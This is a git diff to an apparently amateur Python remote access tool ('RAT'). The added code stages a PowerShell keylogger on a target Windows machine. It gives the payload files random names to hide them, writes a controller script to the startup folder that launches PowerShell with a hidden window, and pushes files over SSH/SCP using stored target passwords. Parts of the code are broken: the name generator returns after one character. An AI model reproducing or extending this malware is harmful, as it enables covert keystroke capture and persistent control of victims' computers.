@@ -9,6 +9,7 @@ import sys
 import getpass
 from modules import *
 from paramiko import SSHClient
+import random as r
 
 
 
@@ -48,6 +49,20 @@ options_menu = """
 
 username = getpass.getuser()
 header = f"{username}@rat $"
+local_path = f"/home/{username}/.RAT" if username != "root" else "/root/.RAT"
+remote_path = "raw.githubusercontent.com/lukeeeeeee335/RAT/main"
+
+def random_text():
+    lower_case = "abcdefghijklmnopqrstuvwxyz"
+    upper_case = "abcdefghijklmnopqrstuvwxyz".upper()
+
+    charchters = lower_case + upper_case
+    generated_text = ""
+
+    for i in range(5):
+        generated_text+= r.choice(list(charchters))
+        return generated_text
+
 
 #Read config file
 def read_config(config_file):
@@ -56,6 +71,8 @@ def read_config(config_file):
     configuration["IPADDRESS"] = read_lines[0].strip()
     configuration["PASSWORD"] = read_lines[1].strip()
     configuration["WORKINGDIRECTORY"] = read_lines[2].strip()
+    configuration["STARTUPDIRECTORY"] = read_lines[3].strip()
+
 
     return configuration
 
@@ -69,14 +86,51 @@ def os_detection():
     
 #connect rat to target
 def connect(address, password):
-
-
-
-   
     #REMOTLY CORRECT
     os.system(f"sshpass -p \"{password}\" ssh rat@{address} 'powershell'")
     #target = SSHClient()
-    #target.connect(ipv4, username='rat', password=target_password)
+    #target.connect(address, username='rat', password=target_password)
+
+#remote upload with SCP to trasfer files from win to kali
+def remoteupload(address, password, upload_file, path):
+    os.system(f"sshpass -p \"{password}\" scp {upload_file} rat@{address}:{path}")
+
+#remote download with SCP
+def remotedownload(address, password, download_file, path):
+    os.system(f"sshpass -p \"{password}\" scp -r rat@{address}:{path} {local_path}")
+
+
+
+def keylogger(address, target_password, working_dir, startup_dir):
+    keylogger = (f"{local_path}/payloads/keylogger.ps1")
+    controller = (f"{local_path}/payloads/c.cmd")
+    scheduler = (f"{local_path}/payloads/l.ps1")
+
+    # obfuscated files
+    obfuscated_controller = random_text() + ".cmd"
+    obfuscated_keylogger = random_text() + ".ps1"
+    obfuscated_scheduler = random_text() + ".ps1"
+
+    with open(obfuscated_controller, "w") as f:
+        f.write("@echo off")
+        f.write(f"powershell Start-Process powershell.exe -windowstyle hidden \"{working_dir}/\"")
+
+            
+
+    #file staging 
+    os.system(f"cp {controller} {local_path}/{obfuscated_controller}")
+    os.system(f"cp {keylogger} {local_path}/{obfuscated_keylogger}")
+    os.system(f"cp {scheduler} {local_path}/{obfuscated_scheduler}")
+
+    #remote upload
+    remoteupload(address, target_password, obfuscated_controller, startup_dir) #for controller
+    remoteupload(address, target_password, obfuscated_keylogger, working_dir) #for Keylogger
+    remoteupload(address, target_password, obfuscated_scheduler, working_dir) #for scheduler
+
+
+
+
+
 
 #terminate programe
 def exit():
@@ -98,12 +152,22 @@ def cli(arguments):
             exit()
         
         #get config info
-        ipv4 = configuration.get("IPADDRESS")
+        address = configuration.get("IPADDRESS")
         target_password = configuration.get("PASSWORD")
         working_dir = configuration.get("WORKINGDIRECTORY")
+        startup_dir = configuration.get("STARTUPDIRECTORY")
 
         if option == "0":
-            connect(ipv4, target_password)
+            connect(address, target_password)
+
+        elif option == "1":
+            keylogger(address, target_password, working_dir, startup_dir)
+
+
+
+
+
+
     # If arguments dont exsist
     else:
         print(help_menu)
